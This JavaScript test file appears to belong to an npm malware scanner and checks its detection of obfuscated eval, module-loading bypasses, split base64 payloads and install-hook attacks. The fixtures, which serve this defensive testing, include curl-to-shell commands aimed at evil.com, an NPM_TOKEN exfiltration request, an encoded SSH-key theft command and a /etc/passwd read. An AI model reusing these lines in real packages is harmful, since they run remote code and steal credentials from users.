'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js', extraFiles = {}) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-auditv2-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-auditv2-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  for (const [name, content] of Object.entries(extraFiles)) {
    fs.writeFileSync(path.join(tmp, name), content);
  }
  return tmp;
}

async function runAuditV2RemediationTests() {
  console.log('\n=== AUDIT V2 REMEDIATION TESTS (v2.9.9) ===\n');

  // ===================================================================
  // CHANTIER 1: Config Security — .muaddibrc.json in scanned package
  // ===================================================================

  await asyncTest('C1: .muaddibrc.json inside scanned package → IGNORED (score unchanged)', async () => {
    // Create a package with a neutralizing config AND a clear threat
    const code = `const cp = require('child_process');\ncp.execSync('curl http://evil.com | sh');`;
    const maliciousConfig = JSON.stringify({
      severityWeights: { critical: 0, high: 0, medium: 0, low: 0 }
    });
    const tmp = makeTempPkg(code, 'index.js', { '.muaddibrc.json': maliciousConfig });
    try {
      const result = await runScanDirect(tmp);
      // The config should be IGNORED — threats should still be detected with non-zero score
      const score = result.summary ? result.summary.riskScore : 0;
      assert(score > 0, `Score should be >0 (config ignored), got ${score}`);
      const hasExec = result.threats.some(t => t.type === 'dangerous_exec');
      assert(hasExec, 'Should still detect dangerous_exec despite attacker config');
      // Check for the security warning (index.js prefixes config warnings with [CONFIG])
      const hasWarning = result.warnings && result.warnings.some(w =>
        w.includes('SECURITY') && w.includes('.muaddibrc.json'));
      assert(hasWarning, 'Should emit SECURITY warning about config in scanned package');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C1: --config explicit path → APPLIED', async () => {
    const code = `const x = process.env.GITHUB_TOKEN;`;
    const tmp = makeTempPkg(code);
    // Create a valid config in a separate safe location
    const configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-config-'));
    const configPath = path.join(configDir, '.muaddibrc.json');
    fs.writeFileSync(configPath, JSON.stringify({
      riskThresholds: { critical: 90, high: 60, medium: 30 }
    }));
    try {
      const result = await runScanDirect(tmp, { configPath });
      // Config should be applied (check warnings for loaded message — prefixed with [CONFIG])
      const hasLoaded = result.warnings && result.warnings.some(w =>
        w.includes('Loaded custom thresholds'));
      assert(hasLoaded, 'Should indicate config was loaded');
    } finally {
      cleanupTemp(tmp);
      cleanupTemp(configDir);
    }
  });

  await asyncTest('C1: No config anywhere → defaults (no error)', async () => {
    const code = `console.log('benign');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      // Should not crash and should return valid result
      assert(result !== null, 'Should return a result');
      const score = result.summary ? result.summary.riskScore : 0;
      assert(score >= 0, `Score should be >= 0, got ${score}`);
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 2: BinaryExpression computed property resolution
  // ===================================================================

  await asyncTest('C2: var a="ev",b="al"; globalThis[a+b]("code") → CRITICAL dangerous_call_eval', async () => {
    const code = `var a='ev',b='al';\nglobalThis[a+b]('code');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect eval via concat as CRITICAL');
      assertIncludes(t.message, 'eval', 'Message should mention eval');
      assertIncludes(t.message, 'concat evasion', 'Message should mention concat evasion');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: const x="Fun",y="ction"; global[x+y]("return 1")() → CRITICAL', async () => {
    const code = `const x='Fun',y='ction';\nglobal[x+y]('return 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect Function via concat as CRITICAL');
      assertIncludes(t.message, 'Function', 'Message should mention Function');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: globalThis["toString"]() → no false positive on known method', async () => {
    // This tests that literal string property access (already existing detection) gives
    // correct result — toString is not eval/Function
    const code = `const result = globalThis["toString"]();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const evalThreat = result.threats.find(t =>
        t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(!evalThreat, 'toString() should NOT be flagged as CRITICAL eval');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: triple concat var a="e",b="va",c="l"; globalThis[a+b+c]() → CRITICAL', async () => {
    const code = `var a='e',b='va',c='l';\nglobalThis[a+b+c]('malicious');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect eval via triple concat as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 3: process.mainModule.require detection
  // ===================================================================

  await asyncTest('C3: process.mainModule.require("child_process").exec("ls") → CRITICAL dynamic_require', async () => {
    const code = `process.mainModule.require('child_process').exec('ls');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require(child_process) as CRITICAL');
      assertIncludes(t.message, 'child_process', 'Message should mention child_process');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C3: process.mainModule.require("fs") → CRITICAL dynamic_require', async () => {
    const code = `const f = process.mainModule.require('fs');\nf.readFileSync('/etc/passwd');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require(fs) as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C3: process.mainModule.require("some-lib") → HIGH dynamic_require', async () => {
    const code = `const lib = process.mainModule.require('some-lib');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require() for non-dangerous module');
      assert(t.severity === 'HIGH', `Non-dangerous module should be HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 4: Module._load detection
  // ===================================================================

  await asyncTest('C4: require("module")._load("child_process") → CRITICAL module_load_bypass', async () => {
    const code = `require('module')._load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect Module._load() as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: const M = require("module"); M._load("net") → CRITICAL', async () => {
    const code = `const M = require('module');\nM._load('net');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect M._load() via moduleAliases as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: Module._load with node:module prefix → CRITICAL', async () => {
    const code = `const Mod = require('node:module');\nMod._load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect _load via require("node:module") alias');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: module._compile still detected (non-regression)', async () => {
    const code = `const m = require('module');\nm._compile('malicious code', 'test.js');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_compile');
      assert(t, 'module._compile should still be detected (non-regression)');
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // AUDIT V3 BLOC 2: Destructuring + Prototype Chain (B3)
  // ===================================================================

  console.log('\n  --- Audit v3 Bloc 2: Destructuring + Prototype Chain ---\n');

  // 2a: Destructuring tracking for require('module')
  await asyncTest('B3-2a: const { _load } = require("module"); _load("child_process") → CRITICAL module_load_bypass', async () => {
    const code = `const { _load } = require('module');\n_load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect destructured _load as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2a: const { _load: loader } = require("module"); loader("net") → CRITICAL', async () => {
    const code = `const { _load: loader } = require('module');\nloader('net');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect renamed destructured _load as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2a: const { _load } = require("node:module") → CRITICAL (node: prefix)', async () => {
    const code = `const { _load } = require('node:module');\n_load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect destructured _load from node:module');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // 2a: Destructuring tracking for globalThis eval/Function
  await asyncTest('B3-2a: const { eval: e } = globalThis; e("code") → dangerous_call_eval', async () => {
    const code = `const { eval: e } = globalThis;\ne('malicious code');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval');
      assert(t, 'Should detect destructured eval from globalThis as dangerous_call_eval');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2a: const { Function: F } = global; F("return 1") → dangerous_call_function', async () => {
    const code = `const { Function: F } = global;\nF('return 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_function');
      assert(t, 'Should detect destructured Function from global as dangerous_call_function');
    } finally { cleanupTemp(tmp); }
  });

  // 2b: AsyncFunction constructor via prototype chain
  await asyncTest('B3-2b: Object.getPrototypeOf(async function(){}).constructor("code")() → CRITICAL dangerous_constructor', async () => {
    const code = `Object.getPrototypeOf(async function(){}).constructor('return fetch("http://evil.com")')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_constructor');
      assert(t, 'Should detect AsyncFunction constructor via prototype chain');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2b: Object.getPrototypeOf(function*(){}).constructor("code")() → CRITICAL dangerous_constructor', async () => {
    const code = `Object.getPrototypeOf(function*(){}).constructor('yield 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_constructor');
      assert(t, 'Should detect GeneratorFunction constructor via prototype chain');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2b: const AF = Object.getPrototypeOf(async function(){}).constructor; AF("code") → detected via alias', async () => {
    const code = `const AF = Object.getPrototypeOf(async function(){}).constructor;\nAF('return process.env')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const hasConstructorOrAlias = result.threats.some(t =>
        t.type === 'dangerous_call_function' || t.type === 'dangerous_constructor'
      );
      assert(hasConstructorOrAlias, 'Should detect AsyncFunction constructor assigned to variable');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-2b: Reflect.getPrototypeOf(async function(){}).constructor("code") → CRITICAL', async () => {
    const code = `Reflect.getPrototypeOf(async function(){}).constructor('return 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_constructor');
      assert(t, 'Should detect Reflect.getPrototypeOf variant');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // Negative tests
  await asyncTest('B3-neg: const { readFileSync } = require("fs") → no module_load_bypass', async () => {
    const code = `const { readFileSync } = require('fs');\nconst data = readFileSync('./config.json', 'utf8');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(!t, 'Legitimate fs destructuring should NOT trigger module_load_bypass');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B3-neg: Object.getPrototypeOf(function(){}).constructor → NOT flagged (regular Function)', async () => {
    const code = `const F = Object.getPrototypeOf(function(){}).constructor;\nF('return 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_constructor');
      assert(!t, 'Regular function prototype constructor should NOT trigger dangerous_constructor (Function is already accessible)');
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // AUDIT V3 BLOC 5: Split Entropy Awareness (B2)
  // ===================================================================

  console.log('\n  --- Audit v3 Bloc 5: Split Entropy (B2) ---\n');

  await asyncTest('B2: eval() with 3-chunk high-entropy concat → CRITICAL split_entropy_payload', async () => {
    // Three base64 chunks that individually might pass but combined have high entropy
    const code = `const a = 'dXNlcm5hbWU6cGFzc3dvcmQ=';\nconst b = 'Y3VybCBodHRwOi8vZXZpbC5jb20=';\nconst c = 'L3N0ZWFsP3Q9JChjYXQgfi8uc3NoL2lkX3JzYSk=';\neval(a + b + c);`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'split_entropy_payload');
      assert(t, 'Should detect split high-entropy payload in eval');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B2: Buffer.from() with 4-chunk concat variable → CRITICAL', async () => {
    const code = `const p1 = 'cmVxdWlyZSgiY2hpbGRfcH';\nconst p2 = 'JvY2VzcyIpLmV4ZWNTeW5j';\nconst p3 = 'KCJjdXJsIGh0dHA6Ly9ldm';\nconst p4 = 'lsLmNvbS9zdGVhbCIp';\nconst payload = p1 + p2 + p3 + p4;\nrequire('child_process').exec(Buffer.from(payload, 'base64').toString());`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'split_entropy_payload');
      assert(t, 'Should detect split high-entropy payload in Buffer.from');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B2: atob() with concat variable → CRITICAL', async () => {
    // Random-looking high-entropy chunks (5.58 bits combined) simulating encrypted payload
    const code = `const x = 'x8Ks2pMn7vRtYqWz';\nconst y = 'Lj5FhN3dCe9GuXbA';\nconst z = 'kPf6ViTm1BwEoScH';\nconst payload = x + y + z;\natob(payload);`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'split_entropy_payload');
      assert(t, 'Should detect split high-entropy payload in atob');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B2-neg: Normal string concat in eval (low entropy, 2 chunks) → NOT flagged', async () => {
    const code = `const greeting = 'Hello, ';\nconst name = 'World!';\neval(greeting + name);`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'split_entropy_payload');
      assert(!t, 'Normal low-entropy 2-chunk concat should NOT trigger split_entropy_payload');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B2-neg: URL building with 3+ chunks (low entropy) → NOT flagged', async () => {
    const code = `const proto = 'https://';\nconst host = 'api.example.com';\nconst path = '/v1/users';\nconst url = proto + host + path;\nfetch(url);`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'split_entropy_payload');
      assert(!t, 'URL building with low-entropy chunks should NOT trigger split_entropy_payload');
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // AUDIT V3 BLOC 6: Lifecycle Compound (B6)
  // ===================================================================

  console.log('\n  --- Audit v3 Bloc 6: Lifecycle File Exec (B6) ---\n');

  await asyncTest('B6: preinstall "node setup.js" + setup.js with exec(curl) → CRITICAL lifecycle_file_exec', async () => {
    const setupCode = `const cp = require('child_process');\ncp.exec('curl http://evil.com/steal | sh');`;
    const tmp = makeTempPkg('// main module', 'index.js', { 'setup.js': setupCode });
    // Override package.json with lifecycle script
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-b6-pkg', version: '1.0.0',
      scripts: { preinstall: 'node setup.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_file_exec');
      assert(t, 'Should detect lifecycle_file_exec when preinstall references malicious setup.js');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B6: postinstall "node ./lib/init.js" + init.js with env exfil → CRITICAL', async () => {
    const initCode = `const token = process.env.NPM_TOKEN;\nrequire('https').request({hostname:'evil.com', path:'/steal?t='+token}).end();`;
    const tmp = makeTempPkg('// main', 'index.js');
    fs.mkdirSync(path.join(tmp, 'lib'));
    fs.writeFileSync(path.join(tmp, 'lib', 'init.js'), initCode);
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-b6-pkg2', version: '1.0.0',
      scripts: { postinstall: 'node ./lib/init.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_file_exec');
      assert(t, 'Should detect lifecycle_file_exec for postinstall + malicious lib/init.js');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B6-neg: preinstall "node setup.js" + setup.js with only mkdir → NO compound', async () => {
    const setupCode = `const fs = require('fs');\nfs.mkdirSync('./cache', { recursive: true });`;
    const tmp = makeTempPkg('// main', 'index.js', { 'setup.js': setupCode });
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-b6-benign', version: '1.0.0',
      scripts: { preinstall: 'node setup.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_file_exec');
      assert(!t, 'Legitimate setup.js with only mkdir should NOT trigger lifecycle_file_exec');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('B6-neg: no lifecycle script → NO compound even if file has threats', async () => {
    const malCode = `const cp = require('child_process');\ncp.exec('curl http://evil.com | sh');`;
    const tmp = makeTempPkg('// main', 'index.js', { 'setup.js': malCode });
    // package.json with NO lifecycle scripts
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-b6-no-lifecycle', version: '1.0.0',
      scripts: { test: 'echo test' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_file_exec');
      assert(!t, 'Without lifecycle script, should NOT trigger lifecycle_file_exec');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runAuditV2RemediationTests };
